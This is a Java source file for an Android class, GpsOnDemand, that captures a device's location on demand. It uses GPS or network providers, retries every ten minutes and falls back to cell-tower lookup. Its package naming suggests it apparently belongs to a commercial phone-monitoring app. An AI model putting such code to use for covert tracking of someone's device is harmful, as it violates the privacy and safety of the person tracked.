package com.vvt.location;

import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;

import com.fx.maind.ref.Customization;
import com.vvt.location.CellLocationToLocation.ConversionException;
import com.vvt.logger.FxLog;
import com.vvt.network.NetworkUtil;

public final class GpsOnDemand implements LocationListenerManager.Callback {
	
	private static final String TAG = "GpsOnDemand";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private static final int DELAY_MILLIS = 600000; // 10 minutes
	
	private static GpsOnDemand sInstance;
	
	private boolean mIsEnabled = false;
	
	private Context mContext;
	private LocationListenerManager mLocationListenerManager;
	private LocationManager mLocationManager;
	
	private OnCaptureListener mListener;
	
	private Timer mRequestLocationTimer;
	private TimerTask mRequestLocationTask;
	
	private Timer mTimeoutTimer;
	private TimerTask mTimeoutTask;
	
	public static GpsOnDemand getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new GpsOnDemand(context);
		}
		return sInstance;
	}

	private GpsOnDemand(Context context) {
		mContext = context;
		mLocationManager = 
			(LocationManager) mContext.getSystemService(
					Context.LOCATION_SERVICE);
	}
	
	public void enable(OnCaptureListener listener) {
		if (LOGV) FxLog.v(TAG, "enable # ENTER ...");
		
		if (mIsEnabled) {
			disable();
		}
		
		mIsEnabled = true;
		mListener = listener;
    	
    	requestLocation();
    	
    	if (LOGV) FxLog.v(TAG, "enable # EXIT ...");
	}
	
	public void disable() {
		if (LOGV) FxLog.v(TAG, "disable # ENTER ...");
		
		if (mIsEnabled) {
			mIsEnabled = false;
			
			unregisterLocationListener();
			cancelTimeoutTask();
			
			if (mRequestLocationTask != null) {
				mRequestLocationTask.cancel();
				mRequestLocationTask = null;
			}
		}
		
		if (LOGV) FxLog.v(TAG, "disable # EXIT ...");
	}
	
	@Override
	public void onLocationChanged(Location location) {
		if (LOGV) FxLog.v(TAG, "onLocationChanged # ENTER ...");
		
		// Unregister location listener
		unregisterLocationListener();
		
		// Cancel timeout task
		cancelTimeoutTask();
		
		// Capture location
		if (mListener != null) mListener.onProviderCapture(location);
		
		if (LOGV) FxLog.v(TAG, "onLocationChanged # EXIT ...");
	}
	
	private void requestLocation() {
		if (LOGV) FxLog.v(TAG, "requestLocation # ENTER ...");
		
		List<String> providers = mLocationManager.getProviders(true);
		FxLog.d(TAG, String.format("requestLocation # Providers: %s", providers));
		
		boolean isActiveProviderAvailable = providers.size() > 0 && 
			(providers.contains(LocationManager.GPS_PROVIDER) || 
			providers.contains(LocationManager.NETWORK_PROVIDER));
		
		if (isActiveProviderAvailable) {
			// Register location listener
			registerLocationListener();
			
			// Schedule time out task
			scheduleTimeoutTask();
		}
		else {
			FxLog.d(TAG, "requestLocation # No enabled providers");
			
			Location gLocation = findGoogleLocation();
			
			if (gLocation == null) {
				if (mListener != null) mListener.onUnableToCapture();
			}
			else {
				if (mListener != null) mListener.onGoogleServiceCapture(gLocation);
			}
		}
		
		if (LOGV) FxLog.v(TAG, "requestLocation # EXIT ...");
	}
	
	private void registerLocationListener() {
		if (LOGV) {
			FxLog.v(TAG, "registerLocationListener # ENTER ...");
		}
		if (mLocationListenerManager == null) {
			mLocationListenerManager = new LocationListenerManager(mContext, this);
		}
		mLocationListenerManager.register();
		FxLog.d(TAG, "registerLocationListener # Registered");
	}
	
	private void unregisterLocationListener() {
		if (LOGV) {
			FxLog.v(TAG, "unregisterLocationListener # ENTER ...");
		}
		if (mLocationListenerManager != null) {
			mLocationListenerManager.unregister();
			mLocationListenerManager = null;
		}
	}
	
	private void scheduleTimeoutTask() {
		if (LOGV) {
			FxLog.v(TAG, "scheduleTimeoutTask # ENTER ...");
		}
		
		// Timeout task
		mTimeoutTask = new TimerTask() {
			@Override
			public void run() {
				if (LOGV) {
					FxLog.v(TAG, "scheduleTimeoutTask.run # ENTER ...");
				}
				startTimeoutTask();
			}
		};
		
		// Timeout timer
		if (mTimeoutTimer == null) {
			mTimeoutTimer = new Timer();
		}
		mTimeoutTimer.schedule(mTimeoutTask, DELAY_MILLIS);
	}
	
	private void scheduleRequestLocationTask() {
		if (LOGV) {
			FxLog.v(TAG, "scheduleRequestLocationTask # ENTER ...");
		}
		
		// Request location task
		mRequestLocationTask = new TimerTask() {
			@Override
			public void run() {
				if (LOGV) {
					FxLog.v(TAG, "mRequestLocationTask.run # ENTER ...");
				}
				requestLocation();
			}
		};
		
		// Request location Timer
		if (mRequestLocationTimer == null) {
			mRequestLocationTimer = new Timer();
		}
		mRequestLocationTimer.schedule(mRequestLocationTask, DELAY_MILLIS);
	}
	
	private void startTimeoutTask() {
		FxLog.d(TAG, "startTimeoutTask # GPS request timeout!!");
		
		// Unregister location listener
		unregisterLocationListener();
		
		Location gLocation = findGoogleLocation();
		
		if (gLocation == null) {
			scheduleRequestLocationTask();
			
			if (mListener != null) mListener.onRetryAfterTimeout();
		}
		else {
			if (mListener != null) mListener.onGoogleServiceCapture(gLocation);
		}
	}
	
	private void cancelTimeoutTask() {
		if (LOGV) {
			FxLog.v(TAG, "cancelTimeoutTask # ENTER ...");
		}
		if (mTimeoutTask != null) {
			mTimeoutTask.cancel();
			mTimeoutTask = null;
		}
	}
	
	private Location findGoogleLocation() {
		boolean hasInternet = NetworkUtil.hasInternetConnection(mContext);
		
		if (!hasInternet) {
			FxLog.d(TAG, "findGoogleLocation # No Internet connection");
			return null;
		}
		
		Location location = null;
		try {
			CellLocationToLocation cellLocationToLocation = 
				CellLocationToLocation.getInstance(mContext);
			
			location = cellLocationToLocation.getLocationOfCurrentCellLocation();
		} 
		catch (ConversionException e) {
			FxLog.e(TAG, e.toString());
		}
		
		return location;
	}
	
	public static interface OnCaptureListener {
		public void onProviderCapture(Location location);
		public void onGoogleServiceCapture(Location location);
		public void onRetryAfterTimeout();
		
		/**
		 * Neither GPS nor G-Location are available at the moment.
		 */
		public void onUnableToCapture();
	}
	
}
